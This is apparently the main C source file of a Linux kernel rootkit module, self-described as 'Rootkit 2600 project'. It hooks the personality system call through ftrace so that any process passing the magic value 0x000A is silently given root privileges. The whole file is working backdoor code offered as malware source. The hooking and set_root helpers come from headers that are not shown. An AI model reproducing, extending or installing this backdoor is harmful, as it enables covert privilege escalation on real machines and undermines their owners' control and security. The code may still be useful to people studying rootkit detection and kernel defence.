#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include "hooker.h"
#include "root.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ostrik");
MODULE_DESCRIPTION("Rootkit 2600 project");
MODULE_VERSION("1.0");

static asmlinkage long (*orig_personality)(const struct pt_regs *);

asmlinkage long hook_personality(const struct pt_regs *regs) {
    unsigned long personality = regs->di;

    if (personality == 0x000A) {
        set_root();
        return 0;
    }

    return orig_personality(regs);
}

struct ftrace_hook hook = HOOK("sys_personality", hook_personality, &orig_personality);

static int __init rootkit_init(void) {
    fh_install_hook(&hook);
    return 0;
}

static void __exit rootkit_exit(void) {
    fh_remove_hook(&hook);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
